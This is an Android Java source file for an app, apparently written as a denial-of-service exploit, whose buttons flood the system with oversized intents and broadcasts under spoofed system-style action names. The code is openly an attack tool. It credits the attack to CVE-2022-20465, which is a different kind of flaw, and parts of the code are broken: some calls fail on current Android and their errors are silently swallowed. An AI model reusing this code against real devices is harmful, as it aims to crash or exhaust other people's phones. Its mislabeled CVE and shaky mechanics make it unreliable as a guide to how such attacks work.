package com.example.dos_exploit;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {

    private TextView statusText;
    private TextView logText;
    private Button launchDoSButton;
    private Button triggerResourceExhaustionButton;
    private Button clearLogsButton;

    private StringBuilder logBuffer = new StringBuilder();
    private Handler mainHandler;
    private ExecutorService executorService = Executors.newFixedThreadPool(2);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mainHandler = new Handler(Looper.getMainLooper());

        // Initialize UI elements
        statusText = findViewById(R.id.statusText);
        logText = findViewById(R.id.logText);
        launchDoSButton = findViewById(R.id.launchDoSButton);
        triggerResourceExhaustionButton = findViewById(R.id.triggerResourceExhaustionButton);
        clearLogsButton = findViewById(R.id.clearLogsButton);

        // Set up button listeners
        launchDoSButton.setOnClickListener(v -> {
            addLog("Starting Exploit #1: Input Validation DoS");
            triggerInputValidationDoS();
        });

        triggerResourceExhaustionButton.setOnClickListener(v -> {
            addLog("Starting Exploit #2: Resource Exhaustion");
            triggerResourceExhaustion();
        });

        clearLogsButton.setOnClickListener(v -> {
            logBuffer.setLength(0);
            logText.setText("Logs cleared");
        });

        statusText.setText("Ready to demonstrate CVE-2022-20465\nTarget: Android 10 (API 29+)");
        addLog("Application initialized");
    }

    private void triggerInputValidationDoS() {
        executorService.execute(() -> {
            try {
                addLog("[Exploit #1] Generating 100 malformed requests...");
                updateStatus("Exploit #1: Running");

                for (int i = 0; i < 100; i++) {
                    Intent intent = new Intent();
                    intent.setAction("android.intent.action.SYSTEM_CRASH_TEST_" + i);

                    Bundle extraData = new Bundle();
                    for (int j = 0; j < 1000; j++) {
                        String largeString = "x".repeat(10000);
                        extraData.putString("key_" + j, largeString);
                    }

                    extraData.putInt("int_max", Integer.MAX_VALUE);
                    extraData.putInt("int_min", Integer.MIN_VALUE);
                    extraData.putString("null_string", null);

                    intent.putExtras(extraData);

                    try {
                        startService(intent);
                    } catch (Exception e) {

                    }

                    if (i % 20 == 0) {
                        addLog("[Exploit #1] Sent " + i + " requests");
                    }

                    Thread.sleep(10);
                }

                addLog("[Exploit #1] COMPLETE");
                updateStatus("Exploit #1: Completed");
            } catch (Exception e) {
                addLog("[Exploit #1] ERROR: " + e.getMessage());
            }
        });
    }

    private void triggerResourceExhaustion() {
        executorService.execute(() -> {
            try {
                addLog("[Exploit #2] Starting resource exhaustion...");
                updateStatus("Exploit #2: Running");

                for (int i = 0; i < 50; i++) {
                    Intent broadcastIntent = new Intent("com.android.internal.SYSTEM_UPDATE_" + i);
                    Bundle bundle = new Bundle();
                    byte[] largeData = new byte[1024 * 1024];
                    bundle.putByteArray("payload_" + i, largeData);
                    broadcastIntent.putExtras(bundle);

                    try {
                        sendBroadcast(broadcastIntent);
                    } catch (Exception e) {
                        // Continue
                    }

                    if (i % 10 == 0) {
                        addLog("[Exploit #2] Sent " + i + "/50");
                    }

                    Thread.sleep(50);
                }

                addLog("[Exploit #2] COMPLETE");
                updateStatus("Exploit #2: Completed");
            } catch (Exception e) {
                addLog("[Exploit #2] ERROR: " + e.getMessage());
            }
        });
    }

    private void updateStatus(String message) {
        mainHandler.post(() -> statusText.setText(message));
    }

    private void addLog(String message) {
        logBuffer.append(message).append("\n");
        mainHandler.post(() -> {
            logText.setText(logBuffer.toString());
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        executorService.shutdown();
    }
}